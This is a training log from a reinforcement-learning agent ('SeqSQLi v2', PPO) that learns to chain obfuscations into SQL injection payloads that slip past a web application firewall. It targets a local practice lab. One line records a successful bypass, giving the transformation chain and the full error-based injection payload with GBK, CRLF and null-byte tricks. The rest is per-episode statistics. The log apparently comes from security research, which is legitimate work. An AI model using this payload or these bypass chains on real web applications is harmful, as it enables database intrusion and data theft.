/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run PPO on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — PPO Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Seed        : 2
============================================================
  [BYPASS] Ep 2659 | steps=11 | seq=ver_50000 -> hex_to_char -> func_sp_nbsp -> unhex_wrap -> case -> case -> null_byte -> gbk_bypass -> case -> case -> crlf
           payload: 1%bf%27%0d%0aaND%0d%0aGTID_SUBSET((user%a0()),1);%00
  Ep 2660 | SR=10% | Steps=14.6 | R=-35.52
  Ep 2670 | SR=0% | Steps=15.0 | R=-38.42
  Ep 2680 | SR=0% | Steps=15.0 | R=-38.12
  Ep 2690 | SR=0% | Steps=15.0 | R=-38.46
  Ep 2700 | SR=0% | Steps=15.0 | R=-38.46
  Ep 2710 | SR=0% | Steps=15.0 | R=-37.66
  Ep 2720 | SR=0% | Steps=15.0 | R=-37.55
  Ep 2730 | SR=0% | Steps=15.0 | R=-37.91
  Ep 2740 | SR=0% | Steps=15.0 | R=-38.39
  Ep 2750 | SR=0% | Steps=15.0 | R=-39.12
  Ep 2760 | SR=0% | Steps=15.0 | R=-37.26
  Ep 2770 | SR=0% | Steps=15.0 | R=-39.11
  Ep 2780 | SR=0% | Steps=15.0 | R=-37.81
  Ep 2790 | SR=0% | Steps=15.0 | R=-37.00
  Ep 2800 | SR=0% | Steps=15.0 | R=-36.95
  Ep 2810 | SR=0% | Steps=15.0 | R=-37.35
  Ep 2820 | SR=0% | Steps=15.0 | R=-37.05
  Ep 2830 | SR=0% | Steps=15.0 | R=-36.73
  Ep 2840 | SR=0% | Steps=15.0 | R=-37.11
  Ep 2850 | SR=0% | Steps=15.0 | R=-38.46
  Ep 2860 | SR=0% | Steps=15.0 | R=-37.39
  Ep 2870 | SR=0% | Steps=15.0 | R=-37.77
  Ep 2880 | SR=0% | Steps=15.0 | R=-37.44
  Ep 2890 | SR=0% | Steps=15.0 | R=-37.09
  Ep 2900 | SR=0% | Steps=15.0 | R=-38.26
  Ep 2910 | SR=0% | Steps=15.0 | R=-38.31
  Ep 2920 | SR=0% | Steps=15.0 | R=-37.03
  Ep 2930 | SR=0% | Steps=15.0 | R=-36.93
  Ep 2940 | SR=0% | Steps=15.0 | R=-37.59
  Ep 2950 | SR=0% | Steps=15.0 | R=-37.85
